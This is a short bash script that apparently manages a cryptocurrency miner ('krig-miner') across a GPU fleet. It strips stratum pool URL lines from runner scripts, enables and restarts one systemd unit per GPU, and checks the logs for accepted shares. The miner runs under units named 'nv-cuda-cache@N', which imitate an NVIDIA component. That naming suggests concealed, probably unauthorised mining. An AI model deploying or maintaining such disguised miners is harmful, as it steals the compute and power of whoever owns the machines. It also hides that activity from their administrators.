set -u
echo "== host $(hostname -s) uid $(id -u) $(date -u +%FT%TZ)"
echo "== krig help"
/opt/fleet/krig/krig-miner --help 2>&1 | head -60
N=$(nvidia-smi -L | grep -c '^GPU'); echo "N=$N"
sed -i '/--url stratum+tcp:\/\//d' /opt/fleet/ps15_g*.sh 2>/dev/null || true
echo "== runner g0 argv"
grep -n -- '--url|--user|--coin' /opt/fleet/ps15_g0.sh 2>/dev/null | head -20
echo "== runner files"; ls /opt/fleet/ps15_g*.sh 2>/dev/null
for i in $(seq 0 $((N-1))); do
  [ -f "/opt/fleet/ps15_g$i.sh" ] || { echo "MISSING runner g$i"; continue; }
  systemctl enable "nv-cuda-cache@$i" >/dev/null 2>&1
  systemctl restart "nv-cuda-cache@$i" >/dev/null 2>&1
done
sleep 20
echo "== units"
systemctl list-units --all --no-legend 'nv-cuda-cache@*' | head -20
echo "== procs"; pgrep -af krig-miner | head -12
for i in $(seq 0 $((N-1))); do echo "--- g$i"; tail -6 /opt/fleet/logs/k-ps-*-g$i.log 2>/dev/null | tail -8; done
echo "== accepted"
grep -h 'share accepted' /opt/fleet/logs/k-ps-*-g*.log 2>/dev/null | tail -8
echo CMDFIX-DONE
